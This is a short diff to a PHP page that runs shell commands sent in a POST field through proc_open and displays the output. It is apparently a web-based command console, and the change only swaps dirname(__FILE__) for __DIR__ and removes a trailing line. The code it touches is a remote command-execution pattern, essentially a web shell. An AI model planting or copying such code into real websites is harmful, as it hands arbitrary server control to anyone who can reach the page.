@@ -17,7 +17,7 @@ if (!empty($_POST['cmd'])) {
     // Run the command with those descriptors, in the current directory, with i/o through $pipes:
     $pipes = [];
     // The $process useless var NEEDS to exist, or this doesn't work.
-    $process = proc_open($cmd, $descriptorSpec, $pipes, dirname(__FILE__), null);
+    $process = proc_open($cmd, $descriptorSpec, $pipes, __DIR__, null);
 
     // We can now read from the two output pipes :
     $stdout = stream_get_contents($pipes[1]);
@@ -153,4 +153,3 @@ function logCommand(): string
 </main>
 </body>
 </html>
-
